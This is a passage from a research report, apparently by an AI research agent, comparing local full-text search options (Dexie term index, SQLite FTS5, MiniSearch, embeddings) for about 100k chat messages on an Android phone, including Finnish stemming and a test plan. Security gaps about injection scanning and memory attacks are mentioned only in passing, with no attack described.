- Never put an API key inside a module. The host makes OpenRouter calls for it, with a per-module budget.
- No marketplace. Manual paste or import of one file, with a review screen listing traits. Snyk's numbers show why.

### Gaps
- No source measures how well injection scanning works.
- I did not reach Unit 42's or Rehberger's primary write-ups on Bedrock memory or ChatGPT memory attacks.
- I did not confirm per-key spend limits on OpenRouter. Worth checking, since a limited key shrinks the damage from theft.
- The `style` leak was tested at sanitiser level only, not rendered in Chrome on Android.

## Local search on the phone: which stack fits around 100k messages and a few hundred notes? Is keyword search enough? What about Finnish?

### Takeaway
Keyword search is enough to start, because the searcher is usually a model that can retry with other forms. In-memory libraries do not fit 100k messages on a phone. Two stacks fit: a Dexie term index with Finnish and English stemming in JavaScript, or SQLite FTS5 in a worker on OPFS.

Recommendation: start with the Dexie term index behind a `SearchIndex` interface, as a derived and droppable index. Move to contentless FTS5 if a phone test shows a size or ranking problem. Skip on-device embeddings. Remote embeddings are the later option.

No public benchmark covers this exact case, so all phone numbers below are estimates. A one-evening test on Mikael's phone should settle it.

### Cited Findings

MiniSearch:
- Version 7.2.0, MIT, last published September 2025 — [npm metadata, read this session](https://www.npmjs.com/package/minisearch)
- Aimed at memory-constrained cases like mobile browsers. The index lives in memory, with exact, prefix and fuzzy search. `processTerm` allows custom stemming — [MiniSearch docs](https://lucaong.github.io/minisearch/)
- Its design document lists very large indexes as a non-goal, gives no index sizes, and leaves stemming to the developer — [MiniSearch design](https://github.com/lucaong/minisearch/blob/master/DESIGN_DOCUMENT.md)

Orama:
- Version 3.1.18, Apache-2.0 — [npm metadata, read this session](https://www.npmjs.com/package/@orama/orama)
- A community comment estimates up to 400 MB of RAM for 100k records (anecdotal) — [Orama discussion 388](https://github.com/orgs/askorama/discussions/388)
- A deployment guide advises server-side search, chunking or lazy loading past 10,000 documents in the browser — [Mintlify Orama guide](https://www.mintlify.com/oramasearch/orama/guides/deployment) (unofficial mirror)

FlexSearch:
- Version 0.8.212, Apache-2.0, last published September 2025 — [npm metadata, read this session](https://www.npmjs.com/package/flexsearch)
- It can mount an IndexedDB store, so the index need not live in RAM. Commits run async in batches. The IndexedDB adapter is among the slower backends for adds. Custom encoders exist. Finnish is not mentioned — [FlexSearch persistent docs](https://github.com/nextapps-de/flexsearch/blob/master/doc/persistent.md)
- Its own README reports 51 million versus about 30,000 single-term operations per second over MiniSearch and Orama. This is on a small in-memory text, written by the author, and it does not measure index size — [FlexSearch README](https://github.com/nextapps-de/flexsearch)

Dexie and IndexedDB term index:
- Dexie 4.4.7, active in October 2026 — [npm metadata, read this session](https://www.npmjs.com/package/dexie)
- One write-up builds chat search with a multiEntry index of stemmed terms. Count each query term, start from the rarest, then filter. On one million messages it went from unusable to almost instant, with no measured times, sizes or device given. Table scans suit under about 10k documents. Per-term counts can be stored separately — [JMP blog](https://blog.jmp.chat/tag/borogove)
- Dexie marks multiEntry with `*`, and `distinct()` avoids duplicates. Compound indexes cannot be multiEntry — [Dexie docs](https://old.dexie.org/docs/MultiEntry-Index)

SQLite WASM and FTS5:
- `@sqlite.org/sqlite-wasm` 3.54.1-build1, published October 2026, 3.0 MB unpacked. `wa-sqlite` on npm is stale at 1.0.0 from January 2024 — [npm metadata, read this session](https://www.npmjs.com/package/@sqlite.org/sqlite-wasm)
- The canonical WASM build includes FTS5 — [SQLite forum](https://sqlite.org/forum/info/28402061cb) (undated post)
- The official `opfs` VFS needs COOP and COEP headers. `opfs-sahpool` does not, but allows one connection. PowerSync prefers wa-sqlite's `OPFSCoopSyncVFS`, which stays fast past 1 GB and needs no such headers. IndexedDB-backed VFS performance degrades over 100 MB. Published November 2025, updated May 2026 — [PowerSync](https://www.powersync.com/blog/sqlite-persistence-on-the-web)
- The same table lists Chrome 108+ for those VFS options. It has no Android column — [PowerSync](https://www.powersync.com/blog/sqlite-persistence-on-the-web)
- Sync access handles need a dedicated worker. Access handles can close when an app is backgrounded on Capacitor, and suspended tabs can make a shared database worker unreachable on Chrome — [PowerSync](https://www.powersync.com/blog/sqlite-persistence-on-the-web)
- A second tab opening the same `opfs-sahpool` database fails — [OpenReplay](https://blog.openreplay.com/sqlite-browser-opfs/) (snippet only)
- In an FTS5 test on 1,636 MiB of email, the index was 743 MiB with `detail=full`, 340 MiB with `column`, 134 MiB with `none`. `column` loses phrase and NEAR queries — [FTS5 docs](https://www.sqlite.org/fts5.html)
- Contentless tables (`content=''`) store only the index. Contentless-delete since 3.43.0 supports delete and replace. BM25 is built in. Trigram gives substring search, needs 3 or more characters, and full-text queries with longer tokens need `detail=full` — [FTS5 docs](https://www.sqlite.org/fts5.html)

Storage durability:
- Chrome allows an origin up to 60% of disk. Under pressure, it evicts the least recently used non-persistent origin, all of its data together. `navigator.storage.persist()` protects it, and Chromium approves or denies based on engagement, without a prompt — [MDN storage quotas](https://developer.mozilla.org/en-US/docs/Web/API/Storage_API/Storage_quotas_and_eviction_criteria)

Finnish:
- FTS5's `porter` tokenizer is designed for English only — [FTS5 docs](https://www.sqlite.org/fts5.html)
- `unicode61` removes diacritics by default, so `ä` folds to `a`. `remove_diacritics 0` turns this off. The trigram tokenizer keeps diacritics by default — [FTS5 docs](https://www.sqlite.org/fts5.html)
- Snowball has a Finnish stemmer, and its demo runs in the browser with generated JavaScript — [Snowball demo](https://snowballstem.org/demo.html). `snowball-stemmers` 0.6.0 on npm is ISC, last published 2022 — [npm metadata, read this session](https://www.npmjs.com/package/snowball-stemmers)
- Voikko's Finnish dictionary can be converted for browser use through Emscripten — [voikko-fi README](https://sources.debian.org/src/voikko-fi/2.4-1/README.md/). An npm `voikko` package, "libvoikko for js", is 1.0.1 from January 2025, 14.1 MB unpacked, with no license or repository shown in its metadata — [npm metadata, read this session](https://www.npmjs.com/package/voikko)
- Airio (2006), on Finnish, German and Swedish: no remarkable difference between stemming and lemmatising, and a lemmatised compound index was almost as good as a decompounded one in monolingual runs — [Airio 2006](https://trepo.tuni.fi/bitstream/10024/65934/1/word_normalization_and_decompounding_2006.pdf) (snippet only; bot wall blocked the PDF)
- McNamee's SIGIR 2008 poster: outside the Romance family, character 4-grams and 5-grams beat Snowball and Morfessor. 4 and 5 were about equal. The Finnish row was not legible to me — [SIGIR08 poster](https://userpages.cs.umbc.edu/nicholas/601/SIGIR08-Poster.pdf) (snippet only)

Embeddings:
- `Xenova/multilingual-e5-small` ONNX files: 118 MB for int8, 235 MB for fp16, 470 MB for full — [Hugging Face](https://huggingface.co/Xenova/multilingual-e5-small/tree/main/onnx)
- `@huggingface/transformers` 4.3.2, active in October 2026 — [npm metadata, read this session](https://www.npmjs.com/package/@huggingface/transformers)
- A desktop test on Windows with Chrome 122 and all-MiniLM-L6-v2 gave 507 ms per item on WASM and 45.7 ms on WebGPU — [Transformers.js benchmark](https://huggingface.co/spaces/Xenova/webgpu-embedding-benchmark/discussions/1). I found no Android numbers
- OpenRouter has `POST /embeddings` with batched input — [OpenRouter embeddings](https://openrouter.ai/docs/api/reference/embeddings)
- Third-party price trackers show Perplexity Embed V1 at $0.004 per million tokens and `gemini-embedding-001` at $0.15 — [OpenRouter compare](https://openrouter.ai/compare/perplexity/pplx-embed-v1-0.6b/openai/text-embedding-ada-002), [Bifrost tracker](https://www.getmaxim.ai/bifrost/llm-cost-calculator/provider/openrouter/model/gemini-embedding-001.md). Prices may be stale

Keyword versus smarter retrieval:
- Letta's agents got 74.0% on LoCoMo with grep-style tools, and with no embeddings required for that result — [Letta](https://www.letta.com/blog/benchmarking-ai-agent-memory)

### Inferences

Comparison at 100k messages plus a few hundred notes. Assumption: an average message of 1 KB gives about 100 MB of text. All sizes are my estimates.

| Option | Index size (est.) | Memory | Query (est.) | Finnish | Reliability |
|---|---|---|---|---|---|
| MiniSearch | Tens to 100+ MB, in RAM | High; must rebuild or load on each start | Fast once loaded | Custom `processTerm` | Poor fit past about 10k messages. Fine for notes alone |
| Orama | About 400 MB anecdotal | Highest | Fast once loaded | Custom tokenizer | Poor fit on a phone |
| FlexSearch + IndexedDB | Unknown | Low | Unknown on a phone | Custom encoder | No Android data. Few users of the adapter |
| Dexie term index | About 30 to 80 MB, unmeasured | Low | Rarest-term strategy; expect tens of ms to 100s of ms | Full control in JS | Same store and same transaction as messages. Atomic. No ranking included |
| SQLite FTS5, contentless | About 20 to 45 MB (`column` to `full`) | Low; WASM heap plus page cache | Likely fastest, with BM25 | Feed stems in from JS | Second store. Worker and OPFS needed. Safe if derived |
| FTS5 trigram | Larger, unmeasured | Low | Good | Handles compounds and inflection | Heavy index. Add only if needed |
| Embeddings on device | 154 MB float32, 38 MB int8 | Must load vectors, plus a 118 MB model | Scan cost plus model load | Unknown | Backfill not practical |
| Embeddings remote | Same vector size, no model | Must load vectors | Network plus scan | Unknown | Sends old chats to the embedding provider |

Arithmetic for vectors: 100k × 384 dimensions × 4 bytes = 153.6 MB, or 38.4 MB at 1 byte. Long messages split into chunks would push this up.

On-device backfill: at 200 ms to 1 s per message on a phone (a guess; desktop WASM was 507 ms), 100k messages takes about 5.5 to 28 hours of foreground compute. Android will not allow that in the background, and it would heat the phone. On-device embedding could cover new messages only, which is not much use for history search.

Remote embedding cost: 100 MB of text is about 25 to 35 million tokens (assumption). That is about $0.10 to $0.14 at $0.004 per million, and $4 to $5 at $0.15 per million. So cost is not the blocker. Privacy and vector memory are the points to weigh.

Why the Dexie term index goes first:
- Mikael's corpus is young. 100k is a ceiling, not today's size.
- It adds no binary, no worker, no OPFS, and no second database to back up.
- Terms can be written in the same transaction as the message. This fits the `storage.ts` seam rule.
- Exact and prefix matching come from plain IndexedDB key ranges. Prefix handles the first part of a compound (`kesä*` finds `kesäloma`).
- A model consumer does not need perfect BM25. Sort by term coverage and recency, and return small snippets. The model can then search again.
- Put terms in a separate table (say `searchTerms`, with a multiEntry `terms` index) rather than on message rows. Then message rows stay light, and dropping the index is one table.

Move to contentless FTS5 if the phone test shows any of these:
- Index size over about 100 MB, or backfill too slow.
- Multi-term queries over about 300 ms.
- Ranking clearly hurts results.

How FTS5 would fit:
- Use a dedicated worker, lazy-loaded, with a `navigator.locks` guard against a second tab.
- Use `opfs-sahpool`. The official `opfs` VFS needs headers that GitHub Pages cannot set (background knowledge). A wa-sqlite build is the alternative, but the npm package is stale, so check the current packaging first.
- Pre-stem in JS, then insert space-joined tokens into a table with `tokenize="unicode61 remove_diacritics 0"`. This avoids a custom C tokenizer, so Finnish stays in one JS module, shared by both index options.
- Contentless means the text stays in Dexie, and snippets are built in JS.
- Keep it derived. If OPFS breaks, delete and rebuild from Dexie. No user data is at risk.

Finnish plan:
- Normalise with NFC and lower-case. Keep `ä` and `ö`, because folding merges different words (`sääri` and `saari`, `pää` and `paa`).
- Index both a Finnish stem and an English stem per token, plus the raw lowered token. Language detection per message is not needed, and mixed messages are normal for a Finnish user.
- Snowball first. Its Finnish stemmer is small and browser-ready. Airio suggests lemmatising does not beat stemming by much.
- Compounds are the gap. Snowball does not split them (background knowledge, no source found). Options, cheapest first: prefix search, then the model searching with the second part as a separate try, then FTS5 trigram or character 4-grams for substring hits, then Voikko.
- Voikko is the strongest tool, but it costs about 14 MB unpacked, licensing needs checking, and it misses slang and names. Load it lazily, if at all.
- The research favours n-grams, but it used newspaper collections and long queries. Chat search has short documents, and a language-aware agent writing the query. The 4-gram gain may be smaller here, and the size cost is real.

The agent can cover Finnish morphology itself. A tool description can tell the model to search with several inflected forms in one OR query. Strong models can produce `kesälomalla`, `kesäloman` and `kesäloma`. This costs nothing and needs no library. Weaker models may do it poorly, so stemming stays as the floor.

Search tool shape:
- `history_search(query, scope, limit)`, returning chat title, date, message id and a snippet.
- `history_read(message_id, around)` for context.
- Keep results short and cap them. Use one interface for notes and messages, with a `kind` field.
- A human search box uses the same index, with prefix on the last word.

`navigator.storage.persist()` should run early. Notes make eviction much more costly. Eviction takes the whole origin, so index and data disappear together and never disagree.

Test plan for the phone (one evening):
1. Generate 100k messages with Finnish and English text, using real length ratios.
2. Build the Dexie term index and contentless FTS5, using the same stems.
3. Record build time, `storage.estimate()`, query p50 and p95, memory peak, and behaviour after backgrounding the app.

### Gaps
- No public benchmark gives index size or query time for any of these libraries at 100k short documents on Android Chrome. Every size and speed in the table is an estimate. I did not run a benchmark, because that means installing packages outside the project, and I had no way to ask first. The test plan above fills this gap better anyway, since desktop numbers would not transfer.
- No Android-specific OPFS reliability data found. PowerSync's table has no Android column.
- FTS5 trigram index size on Finnish text: not found.
- The size of the FTS5-enabled `sqlite3.wasm`: not found. The package is 3.0 MB unpacked, and the binary is a part of that.
- Finnish numbers from McNamee and Airio: I could not open the PDFs.
- Quality of multilingual embeddings on Finnish chat text: not researched in depth.
- `navigator.storage.persist()` grant behaviour for an installed Android PWA: not confirmed.
